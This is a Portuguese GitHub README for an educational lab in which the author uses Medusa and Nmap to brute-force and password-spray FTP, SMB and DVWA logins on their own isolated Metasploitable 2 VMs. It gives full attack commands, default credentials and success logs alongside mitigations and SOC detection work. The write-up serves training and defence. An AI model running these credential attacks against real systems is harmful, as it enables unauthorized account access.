# 🛡️ Laboratório de Cibersegurança: Medusa, SOC e Automação com IA

**Desafio DIO:** implementando um ataque de força bruta com Medusa em ambiente isolado.

[**English summary**](README.en.md) · Português

[![CI](https://github.com/isaacof/dio-medusa-bruteforce-lab/actions/workflows/ci.yml/badge.svg)](https://github.com/isaacof/dio-medusa-bruteforce-lab/actions/workflows/ci.yml)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-Rolling-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![Medusa](https://img.shields.io/badge/Medusa-2.3-e2231a?style=flat-square)
![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=flat-square&logo=python&logoColor=white)
![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-CI-2088FF?style=flat-square&logo=githubactions&logoColor=white)
![SOC](https://img.shields.io/badge/SOC-detec%C3%A7%C3%A3o-0ea5e9?style=flat-square)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-T1110-e11d48?style=flat-square)
![VirtualBox](https://img.shields.io/badge/VirtualBox-7.2-183A61?style=flat-square&logo=virtualbox&logoColor=white)
![DVWA](https://img.shields.io/badge/DVWA-low-88b04b?style=flat-square)
![Licença](https://img.shields.io/badge/licen%C3%A7a-MIT-green?style=flat-square)

> **Projeto educacional executado em ambiente isolado.**
> Todos os testes foram realizados contra máquinas virtuais próprias (Metasploitable 2 e DVWA), em rede **host-only**, sem exposição à internet e sem alvos reais. As técnicas aqui documentadas são para estudo e devem ser usadas somente com **autorização escrita**.

---

## 💼 Resumo para recrutadores

Projeto prático que conecta **ofensiva autorizada**, **defesa (SOC)** e **automação**:

- **SOC / Blue Team:** análise de logs, triagem, mapeamento **MITRE ATT&CK** e regras de detecção (Sigma, SPL e KQL).
- **Pentest em laboratório:** reconhecimento com Nmap, enumeração SMB, força bruta e password spraying com Medusa.
- **Automação com Python:** script que normaliza evidências e gera relatório, JSON para SIEM e prompt sanitizado para IA.
- **Engenharia e documentação:** 8 documentos técnicos, scripts reproduzíveis, CI com GitHub Actions e evidências reais.

> Todo o conteúdo é de um laboratório isolado. Nenhuma credencial real ou dado de terceiros foi utilizado.

---

## 📖 Sobre o projeto

Este repositório documenta a prática do desafio da DIO **“Implementando um ataque de força bruta com Medusa”**. O objetivo foi montar um laboratório com Kali Linux e Metasploitable 2, simular ataques de credenciais em **FTP**, **SMB** e **formulário web (DVWA)**, validar os acessos obtidos e propor **medidas de mitigação** para cada vetor.

Todo o processo foi reproduzido com scripts versionados, wordlists pequenas e evidências reais (logs e capturas de tela). O foco não é “invadir”, e sim entender **como o ataque funciona**, **por que ele funciona** e **o que fazer para impedi-lo**.

### Resultado em uma linha

> Em menos de **1 minuto**, três serviços diferentes foram comprometidos com credenciais padrão/fracas — o que reforça que **senhas fracas e configurações padrão continuam sendo a porta de entrada mais explorada**.

---

## 🎯 Objetivos de aprendizagem

- [x] Compreender ataques de força bruta em serviços diferentes (FTP, SMB e Web).
- [x] Utilizar Kali Linux e Medusa em um ambiente controlado.
- [x] Diferenciar **força bruta**, **password spraying** e **enumeração de usuários**.
- [x] Validar tecnicamente os acessos encontrados.
- [x] Documentar processos técnicos de forma clara, reproduzível e organizada.
- [x] Reconhecer vulnerabilidades comuns e propor mitigações.
- [x] Traduzir os ataques em **detecção SOC**: fontes de log, sinais, consultas e severidade.
- [x] Mapear as técnicas para **MITRE ATT&CK** (`T1110.001`, `T1110.003`, `T1078`).
- [x] Automatizar a triagem das evidências com **Python** e gerar relatório + JSON.
- [x] Preparar um **prompt sanitizado para análise assistida por IA**, com guardrails.
- [x] Demonstrar **CI** com GitHub Actions (lint, links e geração do relatório).
- [x] Usar o GitHub como portfólio técnico.

### Competências demonstradas

| Competência | Onde está no repositório |
|---|---|
| Reconhecimento e enumeração | [`evidencias/nmap/`](evidencias/nmap/) e [`evidencias/smb/`](evidencias/smb/) |
| Ataques de credenciais | [`scripts/`](scripts/) com Medusa em FTP, SMB e web-form |
| Análise e triagem SOC | [`reports/soc-triage.md`](reports/soc-triage.md) e [`docs/08-soc-e-automacao.md`](docs/08-soc-e-automacao.md) |
| Detecção e MITRE ATT&CK | Regras Sigma e Wazuh em [`detections/`](detections/) e consultas em [`docs/08`](docs/08-soc-e-automacao.md) |
| Automação e CI | [`scripts/06-soc-triage.py`](scripts/06-soc-triage.py) e [`.github/workflows/ci.yml`](.github/workflows/ci.yml) |
| Documentação técnica | [`docs/`](docs/) e este README |

---

## 🧪 Ambiente do laboratório

| Componente | Configuração |
|---|---|
| Hipervisor | VirtualBox 7.2.22 |
| Atacante | Kali Linux Rolling (kernel 7.1.5) — `192.168.56.101` |
| Alvo | Metasploitable 2 — `192.168.56.102` |
| Rede | Host-only `192.168.56.0/24` (sem NAT/internet para o alvo) |
| Ferramentas | Medusa 2.3, Nmap 7.99, enum4linux, smbclient, curl |
| Aplicação web | DVWA (Damn Vulnerable Web Application) em `http://192.168.56.102/dvwa/` |

### VMs em execução

![Kali Linux](evidencias/images/01-kali-desktop.png)

![Metasploitable 2](evidencias/images/02-metasploitable-console.png)

> O próprio Metasploitable exibe o aviso: *“Never expose this VM to an untrusted network!”* — exatamente o motivo de usarmos rede host-only.

---

## 🗺️ Arquitetura do laboratório

```mermaid
flowchart LR
    H["Host Windows<br/>192.168.56.1"]:::host
    K["Kali Linux<br/>192.168.56.101"]:::kali
    M["Metasploitable 2<br/>192.168.56.102"]:::target

    H -.->|"VirtualBox Host-only"| K
    H -.->|"VirtualBox Host-only"| M
    K ==>|"Nmap / Medusa"| M

    M --> F["FTP 21<br/>vsftpd 2.3.4"]
    M --> S["SMB 139/445<br/>Samba 3.0.20"]
    M --> W["HTTP 80<br/>Apache + DVWA"]

    classDef host fill:#1f2937,stroke:#9ca3af,color:#fff
    classDef kali fill:#0f172a,stroke:#38bdf8,color:#fff
    classDef target fill:#2a0f0f,stroke:#ef4444,color:#fff
```

---

## ⚖️ Escopo, ética e segurança

- Rede **host-only**: as VMs não têm rota para a internet.
- Alvos **exclusivamente locais** e de propriedade do autor.
- Nenhuma credencial real foi utilizada; todas as senhas são de laboratório.
- As wordlists são **intencionalmente pequenas** para demonstrar o conceito.
- O repositório não contém malware, exploits armados ou dados de terceiros.
- Em um teste real, é obrigatório ter **contrato/escopo assinado** e respeitar janelas e limites acordados.

---

## 🔬 Metodologia

O trabalho seguiu cinco fases:

1. **Reconhecimento** — identificar hosts e serviços expostos.
2. **Enumeração** — descobrir usuários, compartilhamentos e formulários.
3. **Ataque de credenciais** — Medusa nos módulos `ftp`, `smbnt` e `web-form`.
4. **Validação** — confirmar o acesso com ferramentas independentes (`curl`, `smbclient`).
5. **Mitigação** — propor controles preventivos e detectivos para cada vetor.

Os scripts ficam em [`scripts/`](scripts/) e as saídas reais em [`evidencias/`](evidencias/).

---

## 1️⃣ Reconhecimento

Comando executado no Kali:

```bash
nmap -sV -Pn -T4 -p21,22,23,25,80,139,445,3306,5432 192.168.56.102 \
  -oN logs/01-nmap-servicos.txt
```

### Serviços encontrados

| Porta | Serviço | Versão | Relevância |
|---:|---|---|---|
| 21/tcp | FTP | **vsftpd 2.3.4** | Versão com backdoor conhecido (CVE-2011-2523) |
| 22/tcp | SSH | OpenSSH 4.7p1 | Acesso remoto |
| 23/tcp | Telnet | Linux telnetd | Protocolo em texto claro |
| 25/tcp | SMTP | Postfix | Superfície adicional |
| 80/tcp | HTTP | Apache 2.2.8 | DVWA |
| 139/445 | SMB | **Samba 3.0.20** | Compartilhamentos e autenticação |
| 3306 | MySQL | 5.0.51a | Banco de dados |
| 5432 | PostgreSQL | 8.3.x | Banco de dados |

![Nmap](evidencias/images/05-nmap.png)

**Leitura de risco:** além de credenciais fracas, o alvo roda versões **antigas e sem suporte**. Só o banner do FTP já deveria gerar um alerta em qualquer auditoria.

---

## 2️⃣ FTP — força bruta com Medusa

### Contexto

O vsftpd do Metasploitable 2 aceita autenticação por usuário/senha e **não possui bloqueio por tentativas**. A wordlist usada tem 7 usuários e 12 senhas (84 combinações possíveis).

### Wordlists

- [`wordlists/users.txt`](wordlists/users.txt)
- [`wordlists/passwords.txt`](wordlists/passwords.txt)

### Comando

```bash
medusa -h 192.168.56.102 \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M ftp \
  -t 1 -f \
  -O logs/02-ftp-medusa.log
```

| Opção | Função |
|---|---|
| `-h` | Host alvo |
| `-U` / `-P` | Listas de usuários e senhas |
| `-M ftp` | Módulo de autenticação FTP |
| `-t 1` | Uma thread (execução determinística) |
| `-f` | Para ao encontrar a primeira credencial válida |
| `-O` | Grava o log da execução |

### Resultado real

```text
2026-11-09 18:03:50 ACCOUNT FOUND: [ftp] Host: 192.168.56.102
  User: msfadmin Password: msfadmin [SUCCESS]
```

**Credencial válida:** `msfadmin:msfadmin` — encontrada na **16ª tentativa**, em cerca de **45 segundos** (o vsftpd aplica atraso entre tentativas).

### Validação independente

```bash
curl -s ftp://msfadmin:msfadmin@192.168.56.102/
```

```text
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable
```

O acesso foi confirmado: o usuário autenticado lista o diretório `vulnerable` no servidor FTP.

![Medusa FTP](evidencias/images/06-medusa-ftp.png)

### Por que funcionou?

- Credencial **padrão do Metasploitable** (`msfadmin:msfadmin`).
- Ausência de **rate limiting** e de **bloqueio de conta**.
- Serviço exposto sem necessidade e em versão vulnerável.
- Usuário com permissão de leitura no diretório web (`vulnerable`).

### Mitigações

- **Desativar** o FTP e migrar para SFTP/FTPS.
- **Atualizar** o vsftpd (a versão 2.3.4 tem backdoor conhecido — CVE-2011-2523).
- Proibir credenciais padrão e exigir troca no primeiro acesso.
- Aplicar **fail2ban** ou bloqueio progressivo após falhas.
- Restringir por IP/firewall e segmentar o serviço.
- Monitorar falhas de autenticação e alertar em picos.

📄 Detalhes: [`docs/03-ftp.md`](docs/03-ftp.md)

---

## 3️⃣ SMB — enumeração e password spraying

### Enumeração de usuários e compartilhamentos

```bash
smbclient -L //192.168.56.102 -N
enum4linux -U 192.168.56.102
```

O Samba 3.0.20 permitiu **sessão nula (null session)**, revelando:

- **5 compartilhamentos:** `print$`, `tmp`, `opt`, `IPC$`, `ADMIN$`
- **35 usuários**, incluindo `msfadmin`, `user`, `service`, `root`, `postgres`, `mysql`, `www-data` e contas de sistema.

![Enumeração SMB](evidencias/images/07-smb-enum.png)

> A enumeração já entrega metade do trabalho ao atacante: com uma lista de usuários válidos, o espaço de busca de senhas diminui drasticamente.

### Password spraying

**Spraying** = testar **uma única senha** contra **muitos usuários**. É mais discreto que a força bruta tradicional e evita bloqueio de conta por muitas tentativas em um único usuário.

```bash
medusa -h 192.168.56.102 \
  -U wordlists/users-smb.txt \
  -p msfadmin \
  -M smbnt \
  -t 1 -f \
  -O logs/04-smb-spray.log
```

```text
2026-11-09 18:03:57 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102
  User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

O acesso foi aceito com privilégios administrativos no compartilhamento (`ADMIN$`).

### Força bruta direcionada

```bash
medusa -h 192.168.56.102 \
  -u msfadmin \
  -P wordlists/passwords.txt \
  -M smbnt \
  -t 1 -f \
  -O logs/04-smb-brute.log
```

Mesmo resultado: `msfadmin:msfadmin` na **4ª tentativa**.

### Validação

```bash
smbclient //192.168.56.102/tmp -U 'msfadmin%msfadmin' -c 'ls'
```

O comando lista o conteúdo de `/tmp` no servidor, confirmando a autenticação.

![Password spraying SMB](evidencias/images/08-smb-spray.png)

### Por que funcionou?

- Sessão nula habilitada → **enumeração de 35 usuários**.
- Credencial padrão `msfadmin:msfadmin`.
- Samba antigo, sem políticas de bloqueio.
- `ADMIN$` acessível ao usuário comprometido.

### Mitigações

- Desabilitar **SMBv1** e exigir **SMB signing**.
- Restringir sessões nulas (`restrict anonymous = 2` no Samba; políticas equivalentes no Windows).
- **Bloqueio de conta** e senhas fortes com MFA.
- Remover/desabilitar contas padrão e de serviço não utilizadas.
- Aplicar **princípio do menor privilégio** (sem `ADMIN$` para usuário comum).
- Monitorar eventos de logon falho (Windows **4625**, logs do Samba) e alertar sobre spraying.
- Segmentar SMB e bloquear 139/445 na borda.

📄 Detalhes: [`docs/04-smb.md`](docs/04-smb.md)

---

## 4️⃣ DVWA — força bruta em formulário web

### Preparação da sessão

O DVWA exige autenticação e nível de segurança definido. O script faz login com `admin:password`, fixa `security=low` e captura o `PHPSESSID`:

```bash
curl -s -c cookies.txt http://192.168.56.102/dvwa/login.php -o /dev/null
curl -s -b cookies.txt -c cookies.txt \
  -d 'username=admin&password=password&Login=Login' \
  http://192.168.56.102/dvwa/login.php -o /dev/null
curl -s -b cookies.txt -c cookies.txt \
  -d 'security=low&seclev_submit=Submit' \
  http://192.168.56.102/dvwa/security.php -o /dev/null
```

![Login DVWA](evidencias/images/03-dvwa-login.png)

### Ataque com Medusa (`web-form`)

```bash
medusa -h 192.168.56.102 \
  -U wordlists/dvwa-users.txt \
  -P wordlists/dvwa-passwords.txt \
  -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m FORM-DATA:"get?username=&password=&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m CUSTOM-HEADER:"Cookie: PHPSESSID=$SID; security=low" \
  -t 1 -f -v 4 \
  -O logs/05-dvwa-medusa.log
```

| Opção do módulo | Função |
|---|---|
| `FORM` | Caminho do formulário |
| `FORM-DATA` | Método e campos (usuário primeiro, senha depois) |
| `DENY-SIGNAL` | Texto presente quando **falha**; se ausente, a tentativa é marcada como sucesso |
| `CUSTOM-HEADER` | Envia o cookie de sessão e o nível `low` |

### Resultado real

```text
2026-11-09 18:06:46 ACCOUNT FOUND: [web-form] Host: 192.168.56.102
  User: admin Password: password [SUCCESS]
```

A credencial `admin:password` foi encontrada na **primeira tentativa**.

### Validação

A página autenticada retorna:

```text
Welcome to the password protected area admin
```

![DVWA brute force](evidencias/images/04-dvwa-brute-sucesso.png)

![Medusa DVWA](evidencias/images/09-medusa-dvwa.png)

### Por que funcionou?

- Credencial padrão do DVWA (`admin:password`).
- Sem **rate limiting**, **CAPTCHA** ou **bloqueio**.
- Mensagem de erro específica, que permite ao atacante distinguir falha de sucesso.
- Nível de segurança `low` (a aplicação é intencionalmente vulnerável).

### Mitigações

- **Rate limiting** por IP e por conta + **bloqueio temporário**.
- **MFA** para contas privilegiadas.
- **CAPTCHA** após poucas falhas.
- Mensagens de erro **genéricas** (“usuário ou senha inválidos”).
- Senhas fortes com **bcrypt/Argon2** e verificação contra vazamentos.
- **WAF** e monitoramento de picos de POST/GET no login.
- Nunca expor aplicações de treino (DVWA) fora de rede isolada.

📄 Detalhes: [`docs/05-dvwa.md`](docs/05-dvwa.md)

---

## 📊 Resultados consolidados

| Vetor | Serviço | Técnica | Credencial | Tentativas | Validação |
|---|---|---|---:|---:|---|
| FTP | vsftpd 2.3.4 | Força bruta | `msfadmin:msfadmin` | 16 | `curl ftp://...` listou `vulnerable` |
| SMB | Samba 3.0.20 | Enumeração + spraying | `msfadmin:msfadmin` | 1 | `smbclient` listou `/tmp`; `ADMIN$` permitido |
| Web | DVWA | Força bruta de formulário | `admin:password` | 1 | Página retornou “Welcome...” |

### Números do laboratório

- **9** portas abertas identificadas.
- **35** usuários enumerados via SMB.
- **5** compartilhamentos SMB listados.
- **3** acessos comprometidos.
- **~1 minuto** entre o início do primeiro ataque e o último acesso válido.

---

## 🛡️ Mitigações consolidadas

### Por vetor

| Vetor | Controles preventivos | Controles detectivos |
|---|---|---|
| FTP | SFTP/FTPS, atualização, sem contas padrão, fail2ban, restrição por IP | Logs de autenticação, alertas de múltiplas falhas |
| SMB | SMBv2/3 + signing, bloquear sessão nula, lockout, menor privilégio, desabilitar contas antigas | Eventos 4625, logs do Samba, SIEM |
| Web | Rate limiting, MFA, CAPTCHA, erros genéricos, hash forte, WAF | Access logs, picos de tentativas, alertas |
| Geral | Senhas longas e únicas, password manager, MFA, patches, segmentação | IDS/IPS, SIEM, threat hunting |

### Princípios que resolvem a maior parte do problema

1. **Eliminar credenciais padrão** e forçar troca no primeiro acesso.
2. **MFA** em todos os acessos administrativos e remotos.
3. **Bloqueio progressivo** e rate limiting em qualquer formulário/serviço de login.
4. **Menor privilégio** — um usuário comprometido não deve acessar `ADMIN$` ou o diretório web inteiro.
5. **Reduzir superfície** — desligar FTP, Telnet, SMBv1 e serviços sem uso.
6. **Atualizar** — versões antigas (vsftpd 2.3.4, Samba 3.0.20, Apache 2.2.8) têm vulnerabilidades públicas.
7. **Monitorar** — força bruta é barulhenta; sem detecção, o ataque passa despercebido.

📄 Guia completo: [`docs/06-mitigacoes.md`](docs/06-mitigacoes.md)

---

## 🛰️ Do ataque à detecção: SOC e automação com IA

Encontrar a credencial é só metade do exercício. A outra metade é **detectar, triar e responder**. Esta seção transforma as evidências do laboratório em um fluxo de trabalho de SOC.

### Pipeline de triagem

```mermaid
flowchart LR
    E["Evidências<br/>Medusa + Nmap + SMB"]:::evidence --> P["06-soc-triage.py"]:::script
    P --> M["soc-triage.md"]:::report
    P --> J["soc-triage.json"]:::report
    P --> A["ai-triage-prompt.md"]:::report
    M --> S["Analista SOC"]:::human
    J --> SIEM["SIEM / SOAR"]:::tool
    A --> LLM["LLM local ou aprovado"]:::tool

    classDef evidence fill:#1f2937,stroke:#9ca3af,color:#fff
    classDef script fill:#0f172a,stroke:#38bdf8,color:#fff
    classDef report fill:#052e16,stroke:#22c55e,color:#fff
    classDef human fill:#2a0f0f,stroke:#ef4444,color:#fff
    classDef tool fill:#1e1b4b,stroke:#818cf8,color:#fff
```

### O que a automação entrega

O script [`scripts/06-soc-triage.py`](scripts/06-soc-triage.py) lê os logs já coletados e:

1. normaliza os eventos `ACCOUNT FOUND` (FTP, SMB e web);
2. classifica técnica e severidade de cada achado;
3. mapeia para **MITRE ATT&CK** (`T1110.001`, `T1110.003`, `T1078`);
4. cruza com o Nmap e a enumeração SMB;
5. **redige credenciais por padrão**;
6. gera Markdown, JSON e um prompt de IA com guardrails.

```bash
python3 scripts/06-soc-triage.py --source evidencias --out reports
```

| Artefato | Uso |
|---|---|
| [`reports/soc-triage.md`](reports/soc-triage.md) | Relatório legível para o analista |
| [`reports/soc-triage.json`](reports/soc-triage.json) | Estrutura para SIEM, SOAR ou dashboard |
| [`reports/ai-triage-prompt.md`](reports/ai-triage-prompt.md) | Prompt sanitizado para LLM, sem credenciais |

### Detecção e IA com segurança

- Regras **Sigma** e **Wazuh** prontas para uso estão em [`detections/`](detections/); consultas **Splunk SPL** e **Elastic KQL** estão em [`docs/08-soc-e-automacao.md`](docs/08-soc-e-automacao.md).
- O prompt de IA é **estático e sanitizado**: o repositório não chama nenhuma API e não envia dados para fora.
- Se você tiver **Ollama** instalado, rode a análise local com `./scripts/08-ai-triage.sh` — nenhum dado sai da máquina.
- Para logs reais, a regra é clara: **sanitizar antes**, preferir **modelo local** e revisar toda saída antes de decidir.
- A IA acelera a escrita e a classificação inicial; **a validação continua humana**.

---

## 🧠 Lições aprendidas

- **Enumeração vale mais que força bruta.** Descobrir 35 usuários válidos via SMB reduziu o esforço do ataque a uma única tentativa de senha.
- **Password spraying é mais eficiente e discreto** que testar milhares de senhas em um único usuário.
- **Credenciais padrão são o caminho mais curto** para o comprometimento: os três vetores caíram com senhas documentadas publicamente.
- **A velocidade depende do serviço.** O FTP levou ~45 s por causa do atraso do vsftpd; SMB e DVWA responderam em menos de 1 s.
- **Validação é parte do teste.** Encontrar a senha não basta; é preciso confirmar o acesso real com outra ferramenta.
- **Documentar é tão importante quanto executar.** Logs, comandos e capturas tornam o resultado auditável e reproduzível.
- **Mitigar é mais barato que detectar depois.** MFA, lockout e remoção de padrões teriam interrompido os três ataques.

---

## 🗂️ Estrutura do repositório

```text
dio-medusa-bruteforce-lab/
├── README.md
├── README.en.md
├── SECURITY.md
├── LICENSE
├── Makefile
├── .gitattributes
├── .gitignore
├── .github/
│   └── workflows/
│       └── ci.yml
├── detections/
│   ├── README.md
│   ├── sigma/
│   │   ├── ftp-brute-force.yml
│   │   ├── smb-password-spraying.yml
│   │   └── web-brute-force.yml
│   └── wazuh/
│       └── dvwa-brute-force.xml
├── docs/
│   ├── README.md
│   ├── 01-ambiente.md
│   ├── 02-reconhecimento.md
│   ├── 03-ftp.md
│   ├── 04-smb.md
│   ├── 05-dvwa.md
│   ├── 06-mitigacoes.md
│   ├── 07-conclusao.md
│   └── 08-soc-e-automacao.md
├── scripts/
│   ├── 00-verificar-ambiente.sh
│   ├── 01-reconhecimento.sh
│   ├── 02-ftp-medusa.sh
│   ├── 03-smb-enum.sh
│   ├── 04-smb-medusa.sh
│   ├── 05-dvwa-medusa.sh
│   ├── 06-soc-triage.py
│   ├── 07-validar-links.py
│   ├── 08-ai-triage.sh
│   └── 99-validar-acessos.sh
├── tests/
│   └── test_soc_triage.py
├── reports/
│   ├── soc-triage.md
│   ├── soc-triage.json
│   └── ai-triage-prompt.md
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
│   ├── users-smb.txt
│   ├── dvwa-users.txt
│   └── dvwa-passwords.txt
└── evidencias/
    ├── 00-ambiente.txt
    ├── nmap/
    ├── ftp/
    ├── smb/
    ├── dvwa/
    └── images/
```

---

## 📚 Documentação

| Documento | Conteúdo |
|---|---|
| [01 — Ambiente](docs/01-ambiente.md) | VirtualBox, rede host-only, Kali, Metasploitable 2 e DVWA |
| [02 — Reconhecimento](docs/02-reconhecimento.md) | Nmap, serviços expostos e leitura de risco |
| [03 — FTP](docs/03-ftp.md) | Força bruta, validação e mitigação |
| [04 — SMB](docs/04-smb.md) | Enumeração, sessão nula, spraying e hardening |
| [05 — DVWA](docs/05-dvwa.md) | Sessão web, módulo `web-form` e defesas |
| [06 — Mitigações](docs/06-mitigacoes.md) | Controles preventivos, detectivos e resposta |
| [07 — Conclusão](docs/07-conclusao.md) | Resultados, aprendizados e próximos passos |
| [08 — SOC e IA](docs/08-soc-e-automacao.md) | MITRE ATT&CK, Sigma, SPL, KQL, Wazuh e automação |

Índice completo: [`docs/README.md`](docs/README.md).

---

## ▶️ Como reproduzir

### Pré-requisitos

- VirtualBox com rede **host-only** `192.168.56.0/24`.
- Kali Linux em `192.168.56.101`.
- Metasploitable 2 em `192.168.56.102`.
- DVWA instalado no Metasploitable (já vem por padrão em `/dvwa/`).

### No Kali

```bash
sudo apt update
sudo apt install -y medusa nmap enum4linux smbclient curl

git clone https://github.com/isaacof/dio-medusa-bruteforce-lab.git
cd dio-medusa-bruteforce-lab
chmod +x scripts/*.sh

./scripts/00-verificar-ambiente.sh
./scripts/01-reconhecimento.sh
./scripts/02-ftp-medusa.sh
./scripts/03-smb-enum.sh
./scripts/04-smb-medusa.sh
./scripts/05-dvwa-medusa.sh
./scripts/99-validar-acessos.sh
```

Os scripts aceitam outro alvo via variável de ambiente:

```bash
TARGET=192.168.56.102 ./scripts/02-ftp-medusa.sh
```

### Análise SOC sem subir as VMs

As evidências já estão versionadas, então a triagem pode ser reproduzida em qualquer máquina com Python 3:

```bash
python3 scripts/06-soc-triage.py --source evidencias --out reports
python3 scripts/07-validar-links.py
```

O primeiro comando gera o relatório SOC, o JSON e o prompt de IA. O segundo valida os links relativos do README e da documentação.

> ⚠️ Use somente em VMs próprias e isoladas. Nunca aponte estes scripts para sistemas de terceiros.

---

## 🧹 Encerrando o laboratório

1. Desligue as VMs (`sudo poweroff` no Kali e no Metasploitable).
2. Remova a rede host-only se não for mais usar.
3. Não exponha o Metasploitable à internet em nenhuma hipótese.
4. Se publicar evidências, **sanitize IPs, hashes e credenciais** de ambientes reais.

---

## 📚 Referências

- [Kali Linux — documentação oficial](https://www.kali.org/docs/)
- [Medusa — projeto original](https://github.com/jmk-foofus/medusa)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap — livro e referência](https://nmap.org/book/)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [OWASP — Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [MITRE ATT&CK — T1110 Brute Force](https://attack.mitre.org/techniques/T1110/)
- [Sigma — regras de detecção](https://github.com/SigmaHQ/sigma)
- [Splunk — Search Processing Language](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [Wazuh — regras customizadas](https://documentation.wazuh.com/current/user-manual/ruleset/rules/custom.html)
- [CVE-2011-2523 — vsftpd 2.3.4 backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [GitHub Docs — Markdown](https://docs.github.com/pt/get-started/writing-on-github)

---

## 👤 Autor

**Isaac** — [github.com/isaacof](https://github.com/isaacof)

Projeto desenvolvido como parte do bootcamp da **DIO**, com foco em segurança ofensiva defensiva, documentação técnica e portfólio.

> “A diferença entre um teste de intrusão e um crime é a autorização.”
